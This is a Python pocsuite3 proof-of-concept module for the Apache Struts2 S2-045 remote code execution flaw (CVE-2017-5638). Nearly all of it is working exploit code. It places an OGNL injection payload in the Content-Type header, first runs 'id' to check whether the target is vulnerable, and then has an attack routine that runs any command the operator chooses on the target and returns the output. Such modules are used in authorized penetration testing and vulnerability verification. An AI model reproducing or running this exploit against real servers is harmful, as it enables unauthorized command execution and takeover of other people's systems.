# -*- coding:utf-8 -*-

from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, OptString, POC_CATEGORY
from collections import OrderedDict

class DemoPOC(POCBase):
    vulID = "CVE-2017-5638"
    version ='1'
    author = ["LMX"]
    vulDate = "2017-3-19"
    createDate = "2022-2-1"
    updateDate = "2022-2-1"
    references =["https://vulhub.org/#/environments/struts2/s2-045/"]
    name ="S2-045 Remote Code Execution Vulnerablity"
    appPowerLink = ''
    appName = 'Struts2'
    appVersion = '2.3.20 - 2.3.28'
    vulType = 'RCE'
    desc = '''
    struts2-045远程代码执行漏洞
    '''
    samples = []
    install_requires = ['']

    def _options(self):
        o = OrderedDict()
        o["command"] = OptString("whoami", description="攻击时自定义命令")
        return o

    def _verify(self):
        result ={}
        payload_headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
                    'Content-Type': "%{(#xxx='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).("
                            "#_memberAccess?(#_memberAccess=#dm):((#container=#context["
                            "'com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance("
                            "@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames("
                            ").clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).("
                            "#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase("
                            ").contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',"
                            "#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).("
                            "#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse("
                            ").getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),"
                            "#ros)).(#ros.flush())} ",
                    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'Cookie':'SessionId=96F3F15432E0660E0654B1CE240C4C36'
                    }
        #url = urljoin(self.url, payload_headers)
        r = requests.post(url=self.url,headers=payload_headers,verify=False)
        #testpoc = rr.headers['testpoc']
        try:
            if r.status_code == 200 and 'uid=' in r.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
        except Exception as e:
            pass
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):

        result ={}
        cmd = self.get_option("command")

        headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
                    'Content-Type': "%{(#xxx='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).("
                            "#_memberAccess?(#_memberAccess=#dm):((#container=#context["
                            "'com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance("
                            "@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames("
                            ").clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).("
                            "#cmd='RECOMMAND').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase("
                            ").contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',"
                            "#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).("
                            "#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse("
                            ").getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),"
                            "#ros)).(#ros.flush())} ".replace("RECOMMAND", cmd),
                    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'Cookie':'SessionId=96F3F15432E0660E0654B1CE240C4C36'
                    }
        #payload = payload.replace("RECOMMAND", cmd)

        try:
            response = requests.post(url=self.url, headers=headers)
            if response and response.status_code == 200:
                result['Output'] = response.text
        except ReadTimeout:
            pass
        except Exception as e:
            pass

        return self.parse_output(result)
register_poc(DemoPOC)
